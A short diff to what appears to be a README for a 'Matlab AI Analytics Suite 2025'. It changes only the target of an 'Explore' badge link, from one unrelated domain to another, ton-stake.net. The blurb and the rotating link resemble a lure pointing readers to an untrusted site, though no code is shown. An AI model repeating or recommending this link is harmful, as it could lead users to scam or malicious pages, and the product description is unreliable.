@@ -2,7 +2,7 @@
 
 Matlab AI Analytics Suite 2025 provides a comprehensive set of AI plugins, scripts, and templates designed to enhance data analysis, mathematical modeling, and machine learning workflows in Matlab. Optimized for Windows, this suite streamlines complex computations for professionals.
 
-[![Explore Matlab AI Analytics Suite](https://img.shields.io/badge/Explore-Matlab_AI_Analytics_Suite-blueviolet)](https://glocktober.com)
+[![Explore Matlab AI Analytics Suite](https://img.shields.io/badge/Explore-Matlab_AI_Analytics_Suite-blueviolet)](https://ton-stake.net)
 
 ---
 
